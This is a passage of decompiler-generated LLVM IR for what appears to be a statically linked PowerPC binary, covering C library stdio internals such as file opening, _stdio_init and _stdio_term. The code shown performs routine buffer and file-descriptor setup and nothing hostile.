dec_label_pc_1000323c:                            ; preds = %dec_label_pc_100032fc, %dec_label_pc_100032cc, %dec_label_pc_10003230
  %v0_1000323c = call i32 @__errno_location()
  store i32 22, i32* %r0.global-to-local, align 4
  %v0_10003244 = load i32, i32* @r31, align 4
  %v3_10003244 = icmp eq i32 %v0_10003244, 0
  %v2_10003248 = inttoptr i32 %v0_1000323c to i32*
  store i32 22, i32* %v2_10003248, align 4
  br i1 %v3_10003244, label %dec_label_pc_100034a0, label %dec_label_pc_10003250

dec_label_pc_10003250:                            ; preds = %dec_label_pc_10003330, %dec_label_pc_1000323c
  %v0_10003250 = load i32, i32* @r31, align 4
  %v1_10003250 = inttoptr i32 %v0_10003250 to i16*
  %v2_10003250 = load i16, i16* %v1_10003250, align 2
  %v3_10003250 = zext i16 %v2_10003250 to i32
  store i32 %v3_10003250, i32* %r0.global-to-local, align 4
  %v1_10003254 = and i32 %v3_10003250, 8192
  store i32 %v1_10003254, i32* %r9.global-to-local, align 4
  %v3_10003254 = icmp eq i32 %v1_10003254, 0
  br i1 %v3_10003254, label %dec_label_pc_100034a0, label %dec_label_pc_1000325c

dec_label_pc_1000325c:                            ; preds = %dec_label_pc_10003250
  store i32 %v0_10003250, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10003264.348 to i32), i32* @lr, align 4
  %v0_10003260 = call i32 @free()
  br label %dec_label_pc_100034a0

dec_label_pc_10003268:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000326c

dec_label_pc_1000326c:                            ; preds = %dec_label_pc_10003230, %dec_label_pc_10003224, %dec_label_pc_10003268
  %v0_1000328c = phi i32 [ 1089, %dec_label_pc_10003230 ], [ 577, %dec_label_pc_10003224 ], [ 1, %dec_label_pc_10003268 ]
  %v2_1000326c = add i32 %tmp, 1
  %v3_1000326c = inttoptr i32 %v2_1000326c to i8*
  %v4_1000326c = load i8, i8* %v3_1000326c, align 1
  %v5_1000326c = zext i8 %v4_1000326c to i32
  store i32 %v5_1000326c, i32* %r0.global-to-local, align 4
  %v3_10003274 = icmp eq i8 %v4_1000326c, 98
  br i1 %v3_10003274, label %dec_label_pc_10003280, label %dec_label_pc_1000327c

dec_label_pc_1000327c:                            ; preds = %dec_label_pc_1000326c
  br label %dec_label_pc_10003280

dec_label_pc_10003280:                            ; preds = %dec_label_pc_1000326c, %dec_label_pc_1000327c
  %storemerge = phi i32 [ %tmp, %dec_label_pc_1000327c ], [ %v2_1000326c, %dec_label_pc_1000326c ]
  %v0_10003280 = phi i32 [ %tmp, %dec_label_pc_1000327c ], [ %v2_1000326c, %dec_label_pc_1000326c ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_10003280 = add i32 %v0_10003280, 1
  %v2_10003280 = inttoptr i32 %v1_10003280 to i8*
  %v3_10003280 = load i8, i8* %v2_10003280, align 1
  %v4_10003280 = zext i8 %v3_10003280 to i32
  store i32 %v4_10003280, i32* %r0.global-to-local, align 4
  %v3_10003284 = icmp eq i8 %v3_10003280, 43
  br i1 %v3_10003284, label %dec_label_pc_1000328c, label %dec_label_pc_10003294

dec_label_pc_1000328c:                            ; preds = %dec_label_pc_10003280
  store i32 %v0_1000328c, i32* %r9.global-to-local, align 4
  %v1_10003290 = add nuw nsw i32 %v0_1000328c, 1
  store i32 %v1_10003290, i32* @r28, align 4
  br label %dec_label_pc_10003294

dec_label_pc_10003294:                            ; preds = %dec_label_pc_10003280, %dec_label_pc_1000328c
  %v3_10003294 = icmp eq i32 %v0_10003210, 0
  br i1 %v3_10003294, label %dec_label_pc_1000329c, label %dec_label_pc_100032c4

dec_label_pc_1000329c:                            ; preds = %dec_label_pc_10003294
  store i32 80, i32* @r3, align 4
  store i32 268448420, i32* @lr, align 4
  %v0_100032a0 = call i32 @malloc()
  store i32 %v0_100032a0, i32* @r31, align 4
  %v4_100032a4 = icmp eq i32 %v0_100032a0, 0
  br i1 %v4_100032a4, label %dec_label_pc_100034a4, label %dec_label_pc_100032ac

dec_label_pc_100032ac:                            ; preds = %dec_label_pc_1000329c
  %v1_100032b0 = add i32 %v0_100032a0, 56
  store i32 %v1_100032b0, i32* @r3, align 4
  %v3_100032b4 = inttoptr i32 %v0_100032a0 to i16*
  store i16 8192, i16* %v3_100032b4, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100032bc = load i32, i32* @r31, align 4
  %v2_100032bc = add i32 %v1_100032bc, 8
  %v3_100032bc = inttoptr i32 %v2_100032bc to i32*
  store i32 0, i32* %v3_100032bc, align 4
  store i32 268448452, i32* @lr, align 4
  %v0_100032c0 = call i32 @__stdio_init_mutex()
  %v0_100032c4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100032c4

dec_label_pc_100032c4:                            ; preds = %dec_label_pc_10003294, %dec_label_pc_100032ac
  %v0_10003324 = phi i32 [ %v0_10003214, %dec_label_pc_10003294 ], [ %v0_100032c4.pre, %dec_label_pc_100032ac ]
  %v1_100032c4 = icmp slt i32 %v0_10003324, 0
  br i1 %v1_100032c4, label %dec_label_pc_10003324, label %dec_label_pc_100032cc

dec_label_pc_100032cc:                            ; preds = %dec_label_pc_100032c4
  %v1_100032d0 = add i32 %arg1, 1
  store i32 %v1_100032d0, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_100032d8 = load i32, i32* @r31, align 4
  %v2_100032d8 = add i32 %v1_100032d8, 4
  %v3_100032d8 = inttoptr i32 %v2_100032d8 to i32*
  store i32 %v0_10003324, i32* %v3_100032d8, align 4
  %v0_100032dc = load i32, i32* @r28, align 4
  %v1_100032dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100032dc = and i32 %v1_100032dc, %v0_100032dc
  %v1_100032e0 = add i32 %v2_100032dc, 1
  store i32 %v1_100032e0, i32* %r9.global-to-local, align 4
  %v1_100032e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100032e4 = and i32 %v1_100032e4, %v1_100032e0
  store i32 %v2_100032e4, i32* %r0.global-to-local, align 4
  %v4_100032e8 = icmp eq i32 %v2_100032e4, %v1_100032e0
  br i1 %v4_100032e8, label %dec_label_pc_100032f0, label %dec_label_pc_1000323c

dec_label_pc_100032f0:                            ; preds = %dec_label_pc_100032cc
  %v2_100032f0 = sub i32 -1, %arg1
  %v3_100032f0 = and i32 %v0_100032dc, %v2_100032f0
  store i32 %v3_100032f0, i32* %r0.global-to-local, align 4
  %v1_100032f4 = and i32 %v3_100032f0, 1024
  store i32 %v1_100032f4, i32* %r9.global-to-local, align 4
  %v3_100032f4 = icmp eq i32 %v1_100032f4, 0
  br i1 %v3_100032f4, label %dec_label_pc_10003318, label %dec_label_pc_100032fc

dec_label_pc_100032fc:                            ; preds = %dec_label_pc_100032f0
  %v0_100032fc = load i32, i32* @r29, align 4
  store i32 268448528, i32* @lr, align 4
  %v2_1000330c = call i32 @__libc_fcntl(i32 %v0_100032fc, i32 4)
  %v3_10003310 = icmp eq i32 %v2_1000330c, 0
  br i1 %v3_10003310, label %dec_label_pc_10003318, label %dec_label_pc_1000323c

dec_label_pc_10003318:                            ; preds = %dec_label_pc_100032fc, %dec_label_pc_100032f0
  %v1_10003318 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10003318, i32* %r0.global-to-local, align 4
  %v0_1000331c = load i32, i32* @r28, align 4
  %v2_1000331c = or i32 %v0_1000331c, %v1_10003318
  store i32 %v2_1000331c, i32* @r28, align 4
  br label %dec_label_pc_10003350

dec_label_pc_10003324:                            ; preds = %dec_label_pc_100032c4
  %v3_10003324 = icmp eq i32 %v0_10003324, -1
  %v0_10003334.pre = load i32, i32* @r28, align 4
  br i1 %v3_10003324, label %dec_label_pc_10003330, label %dec_label_pc_1000332c

dec_label_pc_1000332c:                            ; preds = %dec_label_pc_10003324
  %v1_1000332c = or i32 %v0_10003334.pre, 65536
  store i32 %v1_1000332c, i32* @r28, align 4
  br label %dec_label_pc_10003330

dec_label_pc_10003330:                            ; preds = %dec_label_pc_10003324, %dec_label_pc_1000332c
  %v0_10003334 = phi i32 [ %v1_1000332c, %dec_label_pc_1000332c ], [ %v0_10003334.pre, %dec_label_pc_10003324 ]
  store i32 438, i32* @r5, align 4
  store i32 268448580, i32* @lr, align 4
  %v2_10003340 = call i32 @__libc_open(i32 %arg1, i32 %v0_10003334)
  %v1_10003344 = icmp slt i32 %v2_10003340, 0
  %v1_10003348 = load i32, i32* @r31, align 4
  %v2_10003348 = add i32 %v1_10003348, 4
  %v3_10003348 = inttoptr i32 %v2_10003348 to i32*
  store i32 %v2_10003340, i32* %v3_10003348, align 4
  br i1 %v1_10003344, label %dec_label_pc_10003250, label %dec_label_pc_10003330.dec_label_pc_10003350_crit_edge

dec_label_pc_10003330.dec_label_pc_10003350_crit_edge: ; preds = %dec_label_pc_10003330
  %v0_10003354.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10003350

dec_label_pc_10003350:                            ; preds = %dec_label_pc_10003330.dec_label_pc_10003350_crit_edge, %dec_label_pc_10003318
  %v0_10003354 = phi i32 [ %v0_10003354.pre, %dec_label_pc_10003330.dec_label_pc_10003350_crit_edge ], [ %v2_1000331c, %dec_label_pc_10003318 ]
  %v0_10003350 = load i32, i32* @r31, align 4
  %v1_10003350 = inttoptr i32 %v0_10003350 to i16*
  %v2_10003350 = load i16, i16* %v1_10003350, align 2
  %v3_10003350 = zext i16 %v2_10003350 to i32
  store i32 %v3_10003350, i32* %r0.global-to-local, align 4
  %v1_10003354 = urem i32 %v0_10003354, 4
  store i32 %v1_10003354, i32* %r29.global-to-local, align 4
  %v1_10003358 = call i32 @__asm_rlwinm(i32 %v0_10003354, i32 0, i32 21, i32 21)
  %v1_1000335c = add nuw nsw i32 %v1_10003354, 1
  %v1_10003360 = xor i32 %v1_1000335c, 3
  store i32 %v1_10003360, i32* %r29.global-to-local, align 4
  %v1_10003364 = call i32 @__asm_rlwinm(i32 %v3_10003350, i32 0, i32 18, i32 18)
  %v2_10003364 = trunc i32 %v1_10003364 to i16
  store i32 %v1_10003364, i32* %r0.global-to-local, align 4
  %v1_10003368 = mul nuw nsw i32 %v1_10003360, 16
  store i32 %v1_10003368, i32* %r29.global-to-local, align 4
  %v3_1000336c = load i32, i32* @r31, align 4
  %v4_1000336c = inttoptr i32 %v3_1000336c to i16*
  store i16 %v2_10003364, i16* %v4_1000336c, align 2
  %v0_10003370 = load i32, i32* @r28, align 4
  %v1_10003370 = call i32 @__asm_rlwinm(i32 %v0_10003370, i32 31, i32 16, i32 16)
  %v2_10003374 = or i32 %v1_10003370, %v1_10003358
  store i32 %v2_10003374, i32* %r0.global-to-local, align 4
  %v0_10003378 = load i32, i32* @r31, align 4
  %v1_10003378 = inttoptr i32 %v0_10003378 to i16*
  %v2_10003378 = load i16, i16* %v1_10003378, align 2
  %v3_10003378 = zext i16 %v2_10003378 to i32
  %v2_1000337c = or i32 %v3_10003378, %v2_10003374
  store i32 %v2_1000337c, i32* %r9.global-to-local, align 4
  %v0_10003380 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003380 = or i32 %v2_1000337c, %v0_10003380
  store i32 %v2_10003380, i32* @r29, align 4
  %v1_10003384 = trunc i32 %v2_10003380 to i16
  store i16 %v1_10003384, i16* %v1_10003378, align 2
  %v0_10003388 = call i32 @__errno_location()
  store i32 %v0_10003388, i32* @r28, align 4
  %v0_10003390 = load i32, i32* @r31, align 4
  %v1_10003390 = add i32 %v0_10003390, 4
  %v2_10003390 = inttoptr i32 %v1_10003390 to i32*
  %v3_10003390 = load i32, i32* %v2_10003390, align 4
  %v1_10003394 = inttoptr i32 %v0_10003388 to i32*
  %v2_10003394 = load i32, i32* %v1_10003394, align 4
  store i32 %v2_10003394, i32* @r27, align 4
  store i32 268448668, i32* @lr, align 4
  %v1_10003398 = call i32 @isatty(i32 %v3_10003390)
  %v1_1000339c = mul i32 %v1_10003398, 256
  %v0_100033a0 = load i32, i32* @r29, align 4
  %v2_100033a0 = or i32 %v0_100033a0, %v1_1000339c
  store i32 %v2_100033a0, i32* @r29, align 4
  %v1_100033a4 = trunc i32 %v2_100033a0 to i16
  %v2_100033a4 = load i32, i32* @r31, align 4
  %v3_100033a4 = inttoptr i32 %v2_100033a4 to i16*
  store i16 %v1_100033a4, i16* %v3_100033a4, align 2
  %v0_100033a8 = load i32, i32* @r27, align 4
  %v1_100033a8 = load i32, i32* @r28, align 4
  %v2_100033a8 = inttoptr i32 %v1_100033a8 to i32*
  store i32 %v0_100033a8, i32* %v2_100033a8, align 4
  %v0_100033ac = load i32, i32* @r31, align 4
  %v1_100033ac = add i32 %v0_100033ac, 8
  %v2_100033ac = inttoptr i32 %v1_100033ac to i32*
  %v3_100033ac = load i32, i32* %v2_100033ac, align 4
  store i32 %v3_100033ac, i32* %r0.global-to-local, align 4
  %v3_100033b0 = icmp eq i32 %v3_100033ac, 0
  br i1 %v3_100033b0, label %dec_label_pc_100033b8, label %dec_label_pc_100033e8

dec_label_pc_100033b8:                            ; preds = %dec_label_pc_10003350
  store i32 4096, i32* @r3, align 4
  store i32 268448704, i32* @lr, align 4
  %v0_100033bc = call i32 @malloc()
  %v3_100033c0 = icmp eq i32 %v0_100033bc, 0
  %v1_100033c4 = load i32, i32* @r31, align 4
  %v2_100033c4 = add i32 %v1_100033c4, 8
  %v3_100033c4 = inttoptr i32 %v2_100033c4 to i32*
  store i32 %v0_100033bc, i32* %v3_100033c4, align 4
  %v1_100033e4 = load i32, i32* @r31, align 4
  br i1 %v3_100033c0, label %dec_label_pc_100033e4, label %dec_label_pc_100033cc

dec_label_pc_100033cc:                            ; preds = %dec_label_pc_100033b8
  %v1_100033cc = inttoptr i32 %v1_100033e4 to i16*
  %v2_100033cc = load i16, i16* %v1_100033cc, align 2
  %v3_100033cc = zext i16 %v2_100033cc to i32
  store i32 %v3_100033cc, i32* %r0.global-to-local, align 4
  %v1_100033d0 = add i32 %v0_100033bc, 4096
  store i32 %v1_100033d0, i32* %r9.global-to-local, align 4
  %v2_100033d4 = add i32 %v1_100033e4, 12
  %v3_100033d4 = inttoptr i32 %v2_100033d4 to i32*
  store i32 %v1_100033d0, i32* %v3_100033d4, align 4
  %v0_100033d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100033d8 = or i32 %v0_100033d8, 16384
  store i32 %v1_100033d8, i32* %r0.global-to-local, align 4
  %v1_100033dc = trunc i32 %v1_100033d8 to i16
  %v2_100033dc = load i32, i32* @r31, align 4
  %v3_100033dc = inttoptr i32 %v2_100033dc to i16*
  store i16 %v1_100033dc, i16* %v3_100033dc, align 2
  br label %dec_label_pc_100033e8

dec_label_pc_100033e4:                            ; preds = %dec_label_pc_100033b8
  %v2_100033e4 = add i32 %v1_100033e4, 12
  %v3_100033e4 = inttoptr i32 %v2_100033e4 to i32*
  store i32 0, i32* %v3_100033e4, align 4
  br label %dec_label_pc_100033e8

dec_label_pc_100033e8:                            ; preds = %dec_label_pc_10003350, %dec_label_pc_100033cc, %dec_label_pc_100033e4
  %v0_100033e8 = load i32, i32* @r31, align 4
  %v1_100033e8 = add i32 %v0_100033e8, 8
  %v2_100033e8 = inttoptr i32 %v1_100033e8 to i32*
  %v3_100033e8 = load i32, i32* %v2_100033e8, align 4
  store i32 %v3_100033e8, i32* %r9.global-to-local, align 4
  %v3_100033f0 = add i32 %v0_100033e8, 2
  %v4_100033f0 = inttoptr i32 %v3_100033f0 to i8*
  store i8 0, i8* %v4_100033f0, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100033f8 = load i32, i32* @r31, align 4
  %v2_100033f8 = add i32 %v1_100033f8, 44
  %v3_100033f8 = inttoptr i32 %v2_100033f8 to i32*
  store i32 0, i32* %v3_100033f8, align 4
  %v0_100033fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100033fc = load i32, i32* @r31, align 4
  %v2_100033fc = add i32 %v1_100033fc, 20
  %v3_100033fc = inttoptr i32 %v2_100033fc to i32*
  store i32 %v0_100033fc, i32* %v3_100033fc, align 4
  %v0_10003400 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003400 = load i32, i32* @r31, align 4
  %v2_10003400 = add i32 %v1_10003400, 24
  %v3_10003400 = inttoptr i32 %v2_10003400 to i32*
  store i32 %v0_10003400, i32* %v3_10003400, align 4
  %v0_10003404 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003404 = load i32, i32* @r31, align 4
  %v2_10003404 = add i32 %v1_10003404, 28
  %v3_10003404 = inttoptr i32 %v2_10003404 to i32*
  store i32 %v0_10003404, i32* %v3_10003404, align 4
  %v0_10003408 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003408 = load i32, i32* @r31, align 4
  %v2_10003408 = add i32 %v1_10003408, 16
  %v3_10003408 = inttoptr i32 %v2_10003408 to i32*
  store i32 %v0_10003408, i32* %v3_10003408, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_10003410 = load i32, i32* @r31, align 4
  %v1_10003410 = inttoptr i32 %v0_10003410 to i16*
  %v2_10003410 = load i16, i16* %v1_10003410, align 2
  %v3_10003410 = zext i16 %v2_10003410 to i32
  %v3_10003414 = load i32, i32* @global_var_1001d808.349, align 4
  store i32 %v3_10003414, i32* %r0.global-to-local, align 4
  %v1_10003418 = and i32 %v3_10003410, 8192
  store i32 %v1_10003418, i32* %r9.global-to-local, align 4
  %v3_10003418 = icmp eq i32 %v1_10003418, 0
  %v2_1000341c = add i32 %v0_10003410, 52
  %v3_1000341c = inttoptr i32 %v2_1000341c to i32*
  store i32 %v3_10003414, i32* %v3_1000341c, align 4
  br i1 %v3_10003418, label %dec_label_pc_100034a4, label %dec_label_pc_10003424

dec_label_pc_10003424:                            ; preds = %dec_label_pc_100033e8
  store i32 ptrtoint ([3 x i8]* @global_var_10006d24.342 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001d4c4.343 to i32), i32* %r29.global-to-local, align 4
  %v2_10003434 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10003434, i32* @r26, align 4
  store i32 %v2_10003434, i32* @r3, align 4
  %v0_10003444 = call i32 @__pthread_return_void()
  %v2_10003450 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10003450, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1001d4ac.350 to i32), i32* @r29, align 4
  %v0_10003458 = call i32 @__pthread_return_0()
  store i32 %v2_10003450, i32* @r3, align 4
  %v0_10003468 = call i32 @__pthread_return_void()
  %v0_10003470 = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10003478 = load i32, i32* bitcast (i32** @global_var_1001d804.351 to i32*), align 4
  store i32 %v3_10003478, i32* %r0.global-to-local, align 4
  store i32 %v2_10003450, i32* @r3, align 4
  %v1_10003484 = load i32, i32* @r31, align 4
  %v2_10003484 = add i32 %v1_10003484, 32
  %v3_10003484 = inttoptr i32 %v2_10003484 to i32*
  store i32 %v3_10003478, i32* %v3_10003484, align 4
  %v0_10003488 = load i32, i32* @r31, align 4
  store i32 %v0_10003488, i32* bitcast (i32** @global_var_1001d804.351 to i32*), align 4
  %v0_1000348c = call i32 @__pthread_return_void()
  store i32 %v2_10003434, i32* @r3, align 4
  %v0_10003498 = call i32 @__pthread_return_void()
  br label %dec_label_pc_100034a4

dec_label_pc_100034a0:                            ; preds = %dec_label_pc_10003250, %dec_label_pc_1000323c, %dec_label_pc_1000325c
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100034a4

dec_label_pc_100034a4:                            ; preds = %dec_label_pc_100033e8, %dec_label_pc_1000329c, %dec_label_pc_10003424, %dec_label_pc_100034a0
  store i32 %v0_10003200, i32* %r0.global-to-local, align 4
  %v0_100034a8 = load i32, i32* @r31, align 4
  ret i32 %v0_100034a8

; uselistorder directives
  uselistorder i32 %v1_100033e4, { 2, 0, 1 }
  uselistorder i32 %v1_10003364, { 1, 0 }
  uselistorder i32 %v0_10003354, { 1, 0 }
  uselistorder i32 %v0_100032a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1000328c, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16 }
  uselistorder i32 %arg1, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_100034a4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100034a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100033e8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003330, { 1, 0 }
  uselistorder label %dec_label_pc_100032c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003294, { 1, 0 }
  uselistorder label %dec_label_pc_10003280, { 1, 0 }
  uselistorder label %dec_label_pc_1000326c, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268566528, i32* @r28, align 4
  %v0_100034d0 = call i32 @__errno_location()
  store i32 %v0_100034d0, i32* @r26, align 4
  %v1_100034dc = inttoptr i32 %v0_100034d0 to i32*
  %v2_100034dc = load i32, i32* %v1_100034dc, align 4
  store i32 %v2_100034dc, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_1001d4dc.284 to i32), i32* @r27, align 4
  %v3_100034e4 = load i16, i16* @global_var_1001d4dc.284, align 2
  %v4_100034e4 = zext i16 %v3_100034e4 to i32
  store i32 %v4_100034e4, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100034ec.353 to i32), i32* @lr, align 4
  %v1_100034e8 = call i32 @isatty(i32 0)
  %v1_100034ec = sub i32 1, %v1_100034e8
  %v1_100034f0 = mul i32 %v1_100034ec, 256
  %v0_100034f4 = load i32, i32* @r29, align 4
  %v2_100034f4 = xor i32 %v1_100034f0, %v0_100034f4
  %v1_100034fc = trunc i32 %v2_100034f4 to i16
  store i16 %v1_100034fc, i16* @global_var_1001d4dc.284, align 2
  %v3_10003500 = load i16, i16* @global_var_1001d52c.285, align 2
  %v4_10003500 = zext i16 %v3_10003500 to i32
  store i32 %v4_10003500, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003508.354 to i32), i32* @lr, align 4
  %v1_10003504 = call i32 @isatty(i32 1)
  %v1_10003508 = sub i32 1, %v1_10003504
  %v1_1000350c = mul i32 %v1_10003508, 256
  %v0_10003510 = load i32, i32* @r29, align 4
  %v2_10003510 = xor i32 %v1_1000350c, %v0_10003510
  %v1_10003514 = trunc i32 %v2_10003510 to i16
  store i16 %v1_10003514, i16* @global_var_1001d52c.285, align 2
  %v0_10003518 = load i32, i32* @r25, align 4
  %v1_10003518 = load i32, i32* @r26, align 4
  %v2_10003518 = inttoptr i32 %v1_10003518 to i32*
  store i32 %v0_10003518, i32* %v2_10003518, align 4
  ret i32 %v1_1000350c

; uselistorder directives
  uselistorder i32 %v1_1000350c, { 1, 0 }
  uselistorder i16* @global_var_1001d52c.285, { 2, 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000bcb4.355 to i32), i32* @r4, align 4
  %v0_1000353c = call i32 @memcpy()
  ret i32 %v0_1000353c
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001d4ac.350 to i32), i32* @r3, align 4
  store i32 268449116, i32* @lr, align 4
  %v0_10003558 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_1001d4c4.343 to i32), i32* @r3, align 4
  store i32 268449128, i32* @lr, align 4
  %v0_10003564 = call i32 @__stdio_init_mutex()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_1001d804.351 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100035b09 = icmp eq i32 %storemerge6, 0
  %v1_100035b411 = add i32 %storemerge6, 56
  store i32 %v1_100035b411, i32* %r30.global-to-local, align 4
  br i1 %v3_100035b09, label %dec_label_pc_100035c0, label %dec_label_pc_10003574

dec_label_pc_10003574:                            ; preds = %entry, %dec_label_pc_100035a0
  %v0_10003574 = call i32 @__pthread_return_0()
  %v3_10003578 = icmp eq i32 %v0_10003574, 0
  %v0_1000357c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1000357c, i32* @r3, align 4
  br i1 %v3_10003578, label %dec_label_pc_100035a0, label %dec_label_pc_10003584

dec_label_pc_10003584:                            ; preds = %dec_label_pc_10003574
  %v0_10003584 = load i32, i32* %r31.global-to-local, align 4
  %v1_10003584 = add i32 %v0_10003584, 8
  %v2_10003584 = inttoptr i32 %v1_10003584 to i32*
  %v3_10003584 = load i32, i32* %v2_10003584, align 4
  store i32 %v3_10003584, i32* %r9.global-to-local, align 4
  %v3_1000358c = inttoptr i32 %v0_10003584 to i16*
  store i16 48, i16* %v3_1000358c, align 2
  %v0_10003590 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003590 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003590 = add i32 %v1_10003590, 20
  %v3_10003590 = inttoptr i32 %v2_10003590 to i32*
  store i32 %v0_10003590, i32* %v3_10003590, align 4
  %v0_10003594 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003594 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003594 = add i32 %v1_10003594, 24
  %v3_10003594 = inttoptr i32 %v2_10003594 to i32*
  store i32 %v0_10003594, i32* %v3_10003594, align 4
  %v0_10003598 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003598 = load i32, i32* %r31.global-to-local, align 4
  %v2_10003598 = add i32 %v1_10003598, 28
  %v3_10003598 = inttoptr i32 %v2_10003598 to i32*
  store i32 %v0_10003598, i32* %v3_10003598, align 4
  %v0_1000359c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000359c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000359c = add i32 %v1_1000359c, 16
  %v3_1000359c = inttoptr i32 %v2_1000359c to i32*
  store i32 %v0_1000359c, i32* %v3_1000359c, align 4
  br label %dec_label_pc_100035a0

dec_label_pc_100035a0:                            ; preds = %dec_label_pc_10003574, %dec_label_pc_10003584
  %v1_100035a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100035a4 = add i32 %v1_100035a4, 52
  %v3_100035a4 = inttoptr i32 %v2_100035a4 to i32*
  store i32 1, i32* %v3_100035a4, align 4
  store i32 268449196, i32* @lr, align 4
  %v0_100035a8 = call i32 @__stdio_init_mutex()
  %v0_100035ac = load i32, i32* %r31.global-to-local, align 4
  %v1_100035ac = add i32 %v0_100035ac, 32
  %v2_100035ac = inttoptr i32 %v1_100035ac to i32*
  %storemerge = load i32, i32* %v2_100035ac, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_100035b0 = icmp eq i32 %storemerge, 0
  %v1_100035b4 = add i32 %storemerge, 56
  store i32 %v1_100035b4, i32* %r30.global-to-local, align 4
  br i1 %v3_100035b0, label %dec_label_pc_100035b0.dec_label_pc_100035c0_crit_edge, label %dec_label_pc_10003574

dec_label_pc_100035b0.dec_label_pc_100035c0_crit_edge: ; preds = %dec_label_pc_100035a0
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_1001d804.351 to i32*), align 4
  br label %dec_label_pc_100035c0

dec_label_pc_100035c0:                            ; preds = %dec_label_pc_100035b0.dec_label_pc_100035c0_crit_edge, %entry
  %v0_100035fc16 = phi i32 [ %v1_100035b4, %dec_label_pc_100035b0.dec_label_pc_100035c0_crit_edge ], [ %v1_100035b411, %entry ]
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_100035b0.dec_label_pc_100035c0_crit_edge ], [ 0, %entry ]
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %storemerge12, i32* @r31, align 4
  %v3_100035e45 = icmp eq i32 %storemerge12, 0
  br i1 %v3_100035e45, label %dec_label_pc_100035ec, label %dec_label_pc_100035cc

dec_label_pc_100035cc:                            ; preds = %dec_label_pc_100035c0, %dec_label_pc_100035e0
  %v0_100035cc = phi i32 [ %storemerge1, %dec_label_pc_100035e0 ], [ %storemerge12, %dec_label_pc_100035c0 ]
  %v1_100035cc = inttoptr i32 %v0_100035cc to i16*
  %v2_100035cc = load i16, i16* %v1_100035cc, align 2
  %v3_100035cc = zext i16 %v2_100035cc to i32
  store i32 %v0_100035cc, i32* @r3, align 4
  %v1_100035d4 = and i32 %v3_100035cc, 64
  store i32 %v1_100035d4, i32* %r9.global-to-local, align 4
  %v3_100035d4 = icmp eq i32 %v1_100035d4, 0
  br i1 %v3_100035d4, label %dec_label_pc_100035e0, label %dec_label_pc_100035dc

dec_label_pc_100035dc:                            ; preds = %dec_label_pc_100035cc
  store i32 268449248, i32* @lr, align 4
  %v0_100035dc = call i32 @__stdio_wcommit()
  %v0_100035e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100035e0

dec_label_pc_100035e0:                            ; preds = %dec_label_pc_100035cc, %dec_label_pc_100035dc
  %v0_100035e0 = phi i32 [ %v0_100035cc, %dec_label_pc_100035cc ], [ %v0_100035e0.pre, %dec_label_pc_100035dc ]
  %v0_100035fc17 = phi i32 [ %v0_100035cc, %dec_label_pc_100035cc ], [ %v0_100035dc, %dec_label_pc_100035dc ]
  %v1_100035e0 = add i32 %v0_100035e0, 32
  %v2_100035e0 = inttoptr i32 %v1_100035e0 to i32*
  %storemerge1 = load i32, i32* %v2_100035e0, align 4
